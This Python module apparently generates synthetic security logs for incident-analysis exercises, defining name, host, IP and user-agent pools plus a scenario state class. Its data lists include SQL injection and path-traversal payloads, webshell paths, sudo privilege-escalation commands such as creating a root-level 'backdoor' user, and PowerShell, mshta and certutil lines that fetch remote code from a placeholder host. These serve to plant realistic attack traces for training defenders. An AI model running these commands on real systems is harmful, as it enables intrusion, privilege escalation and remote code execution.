"""
Randomized data pools + a Ctx object that holds one scenario's shared world state
(hostnames, users, IP ranges, domains, timeline...).

All "public" IPs are drawn from RFC 5737 documentation ranges (192.0.2.0/24,
198.51.100.0/24, 203.0.113.0/24) so nothing here is a real routable address.
"""
import random
from datetime import datetime, timedelta

FIRST_NAMES = ["james", "mary", "john", "linda", "robert", "patricia", "michael", "jennifer",
               "david", "elizabeth", "kenji", "amara", "priya", "carlos", "yuki", "fatima",
               "oscar", "nadia", "sven", "chloe", "diego", "anya", "malik", "ingrid"]
LAST_NAMES = ["smith", "johnson", "garcia", "martinez", "davis", "lopez", "wilson", "moore",
              "tanaka", "patel", "kim", "nguyen", "santos", "muller", "andersen", "okafor",
              "hassan", "rossi", "dubois", "svensson", "petrov", "diallo", "costa", "haddad"]

SERVICE_ACCOUNTS = ["svc-backup", "svc-deploy", "svc-monitor", "jenkins", "www-data",
                    "postgres", "svc-cicd", "ansible", "svc-logship"]

HOSTNAME_POOL = {
    "web": ["web-prod-01", "web-prod-02", "web-prod-03", "web-prod-04", "web-edge-01"],
    "app": ["app-prod-01", "app-prod-02", "app-prod-03"],
    "db": ["db-prod-01", "db-prod-02"],
    "bastion": ["bastion01", "bastion02"],
    "fw": ["fw-edge01", "fw-core01"],
    "dns": ["dns-int01", "dns-int02"],
}

# Workstations are per-EMPLOYEE, not shared infrastructure -- unlike the roles above
# (a random subset of named boxes, each getting its own fresh IP via host_ips), every
# human user gets exactly one, and it shares that user's existing internal IP
# (ctx.user_ips) rather than a separate one, since it's the same physical machine an
# auth.log login and an endpoint.log process both originate from. See Ctx.user_workstation.
WKSTN_DEPTS = ["eng", "fin", "hr", "ops", "sales", "legal", "support", "it", "mktg", "design"]
WORKSTATION_NAMES = [f"wkstn-{dept}-{i:02d}" for dept in WKSTN_DEPTS for i in range(1, 5)]

CORP_DOMAINS = ["northfield-logistics.local", "brightpeak-retail.local", "vanguard-analytics.local",
                "harbor-financial.local", "meridian-health.local"]

DOMAINS_LEGIT = ["google.com", "cloudflare.com", "github.com", "ubuntu.com", "microsoft.com",
                 "s3.amazonaws.com", "cdn.jsdelivr.net", "fonts.googleapis.com", "npmjs.org",
                 "docker.io", "outlook.office365.com", "slack.com", "githubusercontent.com",
                 "pool.ntp.org", "letsencrypt.org", "ubuntu.com", "debian.org"]

UA_LEGIT = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148",
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0",
]

UA_TOOLING = [
    "curl/8.4.0",
    "python-requests/2.31.0",
    "Go-http-client/1.1",
    "sqlmap/1.8.2#stable (http://sqlmap.org)",
    "Mozilla/5.0 (Nikto/2.5.0) (Evasions:None) (Test:map_codes)",
    "ZmEu",
    "Wget/1.21.3 (linux-gnu)",
    "masscan/1.3 (https://github.com/robertdavidgraham/masscan)",
]

PATHS_LEGIT = ["/", "/index.html", "/about", "/products", "/products/catalog", "/api/v1/health",
               "/api/v1/users/me", "/static/css/main.css", "/static/js/bundle.js", "/favicon.ico",
               "/images/logo.png", "/cart", "/checkout", "/login", "/logout", "/account/profile",
               "/api/v1/orders", "/blog/2026/quarterly-update", "/contact", "/search"]

SQLI_PAYLOADS = [
    "id=1' OR '1'='1", "id=1' UNION SELECT username,password FROM users--",
    "id=1;DROP TABLE users;--", "id=1' AND SLEEP(5)--", "search=%27%20OR%201%3D1--%20",
    "id=-1' UNION SELECT NULL,NULL,version()--", "user=admin'--", "id=1' OR 1=1#",
    "id=1) OR (1=1", "cat=1' UNION SELECT 1,2,3,4,5--",
]

TRAVERSAL_PAYLOADS = [
    "/../../../../etc/passwd", "/..%2f..%2f..%2fetc%2fpasswd",
    "/images/../../../etc/passwd", "/download?file=../../../../etc/passwd",
    "/cgi-bin/../../../../bin/sh",
]

WEBSHELL_PATHS = ["/uploads/avatar_9241.php", "/wp-content/uploads/2026/03/x.php",
                  "/images/thumb.php.jpg", "/uploads/config.php~", "/static/tmp/shell.php",
                  "/wp-content/plugins/gallery/upload.php"]

SUDO_COMMANDS_BENIGN = [
    "/usr/bin/apt-get update", "/usr/bin/systemctl restart nginx", "/usr/bin/tail -f /var/log/syslog",
    "/usr/bin/systemctl status postgresql", "/bin/journalctl -xe", "/usr/sbin/service cron restart",
    "/usr/bin/docker ps", "/usr/bin/vim /etc/hosts",
]

SUDO_COMMANDS_ABUSE = [
    "/bin/bash", "/usr/bin/passwd root", "/bin/chmod 4755 /bin/bash", "/usr/bin/vim -c ':!bash'",
    "/usr/bin/find / -exec /bin/sh \\; -quit", "/usr/bin/python3 -c import os;os.system('/bin/sh')",
    "/usr/bin/env sh", "/usr/bin/nano /etc/shadow", "/usr/bin/useradd -o -u 0 -g 0 backdoor",
]

EXFIL_PATHS = ["/export/full_customer_dump.csv", "/backup/db_snapshot_2026.sql.gz",
               "/reports/finance_q3_all_accounts.zip", "/api/v1/admin/export?table=all"]

# workstation endpoint.log data -- benign (parent, child, cmdline_template) process trees
# for noise, plus the phishing-lure filenames and LOLBins the malware archetype plants.
# cmdline_template gets .format(u=username) where it references the user.
BENIGN_PROC_CHAINS = [
    ("explorer.exe", "chrome.exe", "chrome.exe"),
    ("explorer.exe", "outlook.exe", "outlook.exe /recycle"),
    ("explorer.exe", "teams.exe", "teams.exe --processStart Teams.exe"),
    ("explorer.exe", "slack.exe", "slack.exe --process-start-args"),
    ("explorer.exe", "excel.exe", "excel.exe C:\\Users\\{u}\\Documents\\Q3_report.xlsx"),
    ("services.exe", "svchost.exe", "svchost.exe -k netsvcs"),
    ("chrome.exe", "chrome.exe", "chrome.exe --type=renderer"),
    ("explorer.exe", "onedrive.exe", "onedrive.exe /background"),
    ("services.exe", "msmpeng.exe", "MsMpEng.exe"),
    ("explorer.exe", "notepad.exe", "notepad.exe C:\\Users\\{u}\\Desktop\\notes.txt"),
    ("explorer.exe", "zoom.exe", "\"C:\\Program Files (x86)\\Zoom\\bin\\Zoom.exe\""),
]

PHISHING_LURES = [
    "invoice_march_2026.pdf.exe", "Q3_bonus_details.doc.exe", "shipping_label.pdf.exe",
    "annual_review_form.docx.exe", "remote_support_tool.pdf.exe", "compensation_review.xls.exe",
]

LOLBIN_COMMANDS = [
    ("powershell.exe", "powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA"),
    ("powershell.exe", "powershell.exe -ep bypass -nop -c IEX(New-Object Net.WebClient).DownloadString('http://x')"),
    ("mshta.exe", "mshta.exe javascript:GetObject('script:http://x/a.sct').Exec()"),
    ("cmd.exe", "cmd.exe /c certutil -urlcache -split -f http://x/p.exe %temp%\\p.exe"),
    ("wscript.exe", "wscript.exe //B //nologo C:\\Users\\Public\\update.vbs"),
]

HEX_CHARS = "0123456789abcdef"

def rand_hex(rng, n):
    return "".join(rng.choice(HEX_CHARS) for _ in range(n))

def rand_internal_ip(rng, subnet_second_octet):
    return f"10.{subnet_second_octet}.{rng.randint(0, 9)}.{rng.randint(2, 250)}"

def rand_public_ip(rng):
    block = rng.choice(["192.0.2", "198.51.100", "203.0.113"])
    return f"{block}.{rng.randint(1, 254)}"


class Ctx:
    def __init__(self, seed, difficulty):
        self.seed = seed
        self.difficulty = difficulty
        self.rng = random.Random(seed)
        rng = self.rng

        self.domain = rng.choice(CORP_DOMAINS)
        self.internal_octet = rng.randint(20, 90)

        # hostnames actually used this run
        self.hosts = {role: rng.sample(names, k=min(len(names), rng.randint(1, len(names))))
                      for role, names in HOSTNAME_POOL.items()}
        self.primary_web_host = self.hosts["web"][0]
        self.primary_db_host = self.hosts["db"][0]
        self.primary_bastion = self.hosts["bastion"][0]
        self.primary_fw = self.hosts["fw"][0]
        self.primary_dns = self.hosts["dns"][0]

        # legit users for this org (8-14). Insertion-ordered list + a set only for the
        # membership check -- iterating a set directly would depend on Python's per-process
        # string hash randomization and silently break --seed reproducibility across runs.
        # Dedupe on the RENDERED username, not the (first, last) pair: two different pairs
        # (e.g. john+smith and jane+smith) can render to the same "jsmith" string.
        # insane stacks up to 7 archetypes at once, several of which each reserve their own
        # protagonist username (password_spraying alone can claim up to 10) -- a small pool
        # would force the reservation fallback to silently double up two archetypes on the
        # same username, bleeding their events together under a username-only grep filter.
        n_users = rng.randint(14, 20) if difficulty == "insane" else rng.randint(8, 14)
        self.users = []
        seen = set()
        while len(self.users) < n_users:
            f, l = rng.choice(FIRST_NAMES), rng.choice(LAST_NAMES)
            uname = f"{f[0]}{l}"
            if uname not in seen:
                seen.add(uname)
                self.users.append(uname)
        self.service_accounts = rng.sample(SERVICE_ACCOUNTS, k=rng.randint(3, 5))
        self.all_local_accounts = self.users + self.service_accounts

        # timeline: incident window, random start within the last 30 days
        days_ago = rng.randint(3, 30)
        base_day = datetime(2026, 9, 17) - timedelta(days=days_ago)
        self.start = base_day.replace(hour=rng.randint(0, 4), minute=rng.randint(0, 59), second=0)
        span_hours = {"easy": 30, "medium": 42, "hard": 60, "insane": 90}[difficulty]
        self.end = self.start + timedelta(hours=span_hours)

        # every internal (10.x) IP handed out this run -- to a user, a host, or an archetype's
        # own internal actor (infected host, DNS tunneling client, port-scan target...) --
        # goes through unique_internal_ip(), and noise generators draw internal addresses
        # through safe_noise_internal_ip(), so background traffic can never coincidentally
        # land on the same address as a planted actor. The internal address space is only
        # ~2490 addresses (10.octet.0-9.2-250), small enough that with thousands of noise
        # events this collision is *likely*, not a rare edge case, without this guard.
        self.reserved_internal_ips = set()

        # internal workstation IPs, per accessible account, AND per infrastructure host.
        # Both draw from the same reservation -- questions like insider_after_hours Q2
        # ("which username owns this IP") and the lateral-pivot chain's firewall
        # corroboration ("which host initiated this connection") do reverse lookups that
        # silently become ambiguous if two different accounts/hosts ever landed on the
        # identical internal address.
        self.user_ips = {u: self.unique_internal_ip() for u in self.all_local_accounts}
        self.host_ips = {h: self.unique_internal_ip()
                          for role_hosts in self.hosts.values() for h in role_hosts}

        # one workstation hostname per human user (service accounts don't have desks) --
        # shares that user's user_ips address rather than getting its own, since an
        # auth.log login and an endpoint.log process from the same person are the same
        # physical machine. This is what lets a question correlate "whose IP is this" in
        # auth.log/access.log against "which named workstation is this" in endpoint.log.
        self.user_workstation = dict(zip(self.users, rng.sample(WORKSTATION_NAMES, k=len(self.users))))

        # a legit-but-regex-heavy cmdline (parentheses, backslashes, dots -- matches the
        # "zoom.exe" entry in BENIGN_PROC_CHAINS) that shows up naturally in ordinary
        # endpoint.log noise -- the endpoint.log analogue of canary_scanner_ua below, for
        # guaranteed -F practice against a workstation log specifically
        self.canary_endpoint_cmdline = "\"C:\\Program Files (x86)\\Zoom\\bin\\Zoom.exe\""

        # every public IP handed out this run goes through unique_public_ip() so noise traffic
        # can never coincidentally collide with an archetype's planted attacker/C2/exfil IP
        self.reserved_ips = set()
        self.benign_noise_ips = [self.unique_public_ip() for _ in range(rng.randint(15, 40))]

        # usernames "reserved" by an archetype as its protagonist -- noise generators skip these
        # so a random benign login/sudo line never gets mixed into a username-only grep filter
        self.reserved_users = set()

        # EXFIL_PATHS choices reserved so two different archetypes never plant activity
        # under the identical sensitive path (see pick_exfil_path)
        self.reserved_paths = set()

        self.canary_scanner_ua = rng.choice(UA_TOOLING)

    def random_ts(self):
        delta = self.end - self.start
        secs = self.rng.randint(0, int(delta.total_seconds()))
        return self.start + timedelta(seconds=secs)

    def unique_public_ip(self):
        ip = rand_public_ip(self.rng)
        while ip in self.reserved_ips:
            ip = rand_public_ip(self.rng)
        self.reserved_ips.add(ip)
        return ip

    def safe_noise_public_ip(self):
        """A public IP for generic noise that just needs to dodge reserved/special IPs
        (repeats across noise lines are fine and realistic; only collision with a
        planted attacker/C2/exfil IP matters)."""
        ip = rand_public_ip(self.rng)
        while ip in self.reserved_ips:
            ip = rand_public_ip(self.rng)
        return ip

    def unique_internal_ip(self):
        """For a user, a host, or an archetype's own internal actor (infected host, DNS
        tunneling client, port-scan target...). See reserved_internal_ips for why this
        matters -- the internal address space is small enough that collisions with noise
        are likely without reserving every planted address."""
        ip = rand_internal_ip(self.rng, self.internal_octet)
        while ip in self.reserved_internal_ips:
            ip = rand_internal_ip(self.rng, self.internal_octet)
        self.reserved_internal_ips.add(ip)
        return ip

    def safe_noise_internal_ip(self):
        """An internal IP for generic noise that just needs to dodge reserved addresses
        (repeats across noise lines are fine and realistic; only collision with a planted
        actor's address matters)."""
        ip = rand_internal_ip(self.rng, self.internal_octet)
        while ip in self.reserved_internal_ips:
            ip = rand_internal_ip(self.rng, self.internal_octet)
        return ip

    def noise_user(self, rng=None):
        rng = rng or self.rng
        pool = [u for u in self.users if u not in self.reserved_users]
        if pool:
            return rng.choice(pool)
        # every real user got reserved by some archetype (can happen when password_spraying
        # alone claims most of the org) -- fall back to a service account rather than falling
        # back to the unfiltered user list, which would silently defeat the reservation.
        return rng.choice(self.service_accounts)

    def pick_protagonist_user(self):
        """Pick (and immediately reserve) a username for an archetype's protagonist.
        Excludes users already claimed by an earlier archetype in this same run --
        otherwise two unrelated stories (e.g. ssh_bruteforce and lateral_movement)
        could land on the same person and their events would bleed into each
        other's username-only grep filters."""
        pool = [u for u in self.users if u not in self.reserved_users]
        u = self.rng.choice(pool or self.users)
        self.reserved_users.add(u)
        return u

    def pick_protagonist_users(self, k):
        pool = [u for u in self.users if u not in self.reserved_users]
        k = min(k, len(pool)) if pool else k
        chosen = self.rng.sample(pool or self.users, k=max(k, 1))
        self.reserved_users.update(chosen)
        return chosen

    def pick_exfil_path(self):
        """data_exfiltration and insider_after_hours both draw from EXFIL_PATHS and both
        can land in the same after-hours window -- reserving the choice keeps them from
        picking the identical path, which would make 'which IP is doing this?' ambiguous
        between the two archetypes' IPs."""
        pool = [p for p in EXFIL_PATHS if p not in self.reserved_paths]
        p = self.rng.choice(pool or EXFIL_PATHS)
        self.reserved_paths.add(p)
        return p

    def new_attacker_ip(self, used):
        ip = self.unique_public_ip()
        used.add(ip)
        return ip
